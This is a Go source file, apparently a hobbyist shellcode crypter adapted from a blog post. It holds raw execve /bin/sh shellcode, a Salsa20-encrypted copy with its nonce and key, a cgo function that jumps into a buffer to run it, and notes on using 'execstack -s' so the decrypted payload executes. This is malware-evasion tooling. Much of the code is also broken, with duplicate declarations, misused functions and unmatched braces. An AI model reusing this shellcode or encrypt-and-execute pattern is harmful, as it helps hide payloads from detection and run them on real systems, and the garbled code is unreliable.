/*/
Uses code from:
https://snowscan.io/custom-crypter/

	// execve shellcode /bin/sh
	in := []byte{
		0xeb, 0x1a, 0x5e, 0x31, 0xdb, 0x88, 0x5e, 0x07,
		0x89, 0x76, 0x08, 0x89, 0x5e, 0x0c, 0x8d, 0x1e,
		0x8d, 0x4e, 0x08, 0x8d, 0x56, 0x0c, 0x31, 0xc0,
		0xb0, 0x0b, 0xcd, 0x80, 0xe8, 0xe1, 0xff, 0xff,
		0xff, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68,
		0x41, 0x42, 0x42, 0x42, 0x42, 0x43, 0x43, 0x43,
		0x43}

	out := make([]byte, len(in))

	// Generate a random 24 bytes nonce
	nonce := make([]byte, 24)
	if _, err := rand.Read(nonce); err != nil {
		panic(err)
	}


Uses code from:
https://snowscan.io/custom-crypter/

Compiling the decrypter uses:
	go build -o decrypter decrypter.go.

There is however another step that needs to be executed
after for the shellcode to work. By default (in newer Golang
versions at least), the stack memory space is not marked
executable so our shellcode wonâ€™t work since it resides on the stack:

To resolve this problem we can make the stack executable again by using the
execstack tool as follows. The shellcode is successfully decrypted
and executed, spawning /bin/sh.

>$ execstack -s decrypter

/*/

package CryptographicFunctions

/*
void call_shellcode(char *code) {
        int (*ret)() = (int(*)())code;
        ret();
}
*/
import "C"
import (
	"fmt"

	"golang.org/x/crypto/salsa20"
)

/*/

in := []byte{0x79, 0x46, 0x15, 0x27, 0xa6, 0xdb, 0xbc, 0x5, 0x84, 0x97, 0x83, 0x7c, 0x4f, 0xed, 0x81, 0xd, 0xf, 0x93, 0x8e, 0x7c, 0xd3, 0xa5, 0x74, 0x99, 0xaa, 0xcd, 0xbe, 0xd0, 0x49, 0x54, 0xce, 0x9d, 0xe7, 0x4a, 0x64, 0x95, 0xc3, 0x83, 0xb8, 0x58, 0x4a, 0xe4, 0x87, 0x49, 0xb3, 0x6e, 0x6a, 0x32, 0x76}

// Paste encrypted shellcode here
in := []byte{0x79, 0x46, 0x15, 0x27, 0xa6, 0xdb, 0xbc, 0x5, 0x84, 0x97, 0x83, 0x7c, 0x4f, 0xed, 0x81, 0xd, 0xf, 0x93, 0x8e, 0x7c, 0xd3, 0xa5, 0x74, 0x99, 0xaa, 0xcd, 0xbe, 0xd0, 0x49, 0x54, 0xce, 0x9d, 0xe7, 0x4a, 0x64, 0x95, 0xc3, 0x83, 0xb8, 0x58, 0x4a, 0xe4, 0x87, 0x49, 0xb3, 0x6e, 0x6a, 0x32, 0x76}

out := make([]byte, len(in))

// Paste nonce here
nonce := []byte{0xc6, 0x2f, 0xb2, 0xd1, 0x94, 0x7b, 0x47, 0xa6, 0x51, 0x5d, 0x57, 0xfb, 0x8a, 0x2c, 0x3e, 0x7f, 0x43, 0x5a, 0xfc, 0xbb, 0x24, 0x4d, 0xc7, 0xbc}

// Paste key here
key := [32]byte{0x24, 0x90, 0xef, 0x80, 0x66, 0xee, 0xda, 0x52, 0xfa, 0xb9, 0x8, 0x37, 0x3f, 0x8e, 0x1c, 0x3b, 0x0, 0xec, 0x7, 0x19, 0x5a, 0x1f, 0x94, 0xe7, 0x2e, 0xdf, 0xee, 0x8d, 0x9, 0x63, 0xe4, 0xb5}


/*/

// bytes_in is shellcode
//     []byte { 0x79,0x46,0x15,0x27,...
func ShellCodeDecrypter(bytes_in []byte, nonce []byte, key *[32]byte) {

	out := make([]byte, len(bytes_in))

	salsa20.XORKeyStream(out, bytes_in, nonce, key)
	for _, element := range out {
		fmt.Printf("%#x,", element)
	}
	// this is how to execute the shellcode
	//C.call_shellcode((*C.char)(unsafe.Pointer(&out[0])))
}

// This function uses the Salsa20 to encrypt a byte field
// with a variable sized nonce
func ByteSizedSalsa(bytes_in []byte, EncryptionKey []byte) (Salsa []byte, derp error) {
	var p *big.Int
	var key [32]byte
	out := make([]byte, len(bytes_in))
	// Generate a random 32 bytes nonce
	// make buffer
	herp := make([]byte, 32)
	// make random 32 bit prime number
	p, derp = rand.Prime(rand.Reader, 32)
	//copy number into buffer
	nonce, derp := copy(herp, p)
	if derp != nil {
		ErrorHandling.ErrorPrinter(derp, "generic error, fix me plz lol <3!")
	}
	///now we figure out the key

	if derp != nil {
		ErrorHandling.ErrorPrinter(derp, "generic error, fix me plz lol <3!")
	}
	// I was advised not to make my own unless I was a professional mathermind
	// this is the easy cheater way, use someone elses work
	salsa20.XORKeyStream(out, in, nonce, &key)

	for _, element := range out {
		// original code treated this like a nullbyte but wat?
		if element == 0 {
			ErrorHandling.ErrorPrinter(derp, "generic error, fix me plz lol <3!")
			//return
			}
		}
	}
}
